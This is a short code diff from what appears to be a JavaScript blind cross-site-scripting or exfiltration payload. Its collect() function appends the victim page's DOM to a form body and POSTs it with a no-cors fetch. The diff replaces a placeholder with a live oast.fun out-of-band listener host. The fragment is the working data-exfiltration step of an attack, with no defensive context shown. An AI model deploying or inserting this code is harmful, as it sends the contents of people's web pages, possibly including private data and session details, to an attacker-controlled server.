@@ -60,7 +60,7 @@ export async function collect() {
     // The important one.
     body.append("dom", data.dom);
 
-    await fetch("https://YOUR-INTERACTSH-URL", {
+    await fetch("https://mhpbgctkqnyudrxqcvecy0n8bl0hb3bad.oast.fun", {
         method: "POST",
         body,
         mode: "no-cors",
